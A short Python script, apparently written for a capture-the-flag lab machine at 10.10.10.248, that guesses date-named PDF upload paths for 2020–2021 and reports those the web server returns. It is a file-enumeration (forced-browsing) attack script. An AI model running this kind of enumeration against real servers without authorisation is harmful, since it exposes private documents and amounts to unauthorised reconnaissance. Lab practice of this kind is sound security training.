import requests, signal, sys

def signal_handler(signal, frame):
    print("\n[!] Saliendo ...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

url="http://10.10.10.248/documents/"
cont = 0

for i in range(2020,2022):
    for j in range(1,13):
        for k in range(1,33):
            date=f'{i}-{j:02d}-{k:02d}-upload.pdf'
            #print(url+date)
            r = requests.get(url+date)
            if (r.status_code == 200):
                print("[+] %s" % date)
                cont += 1

print("Total: %i" % cont)
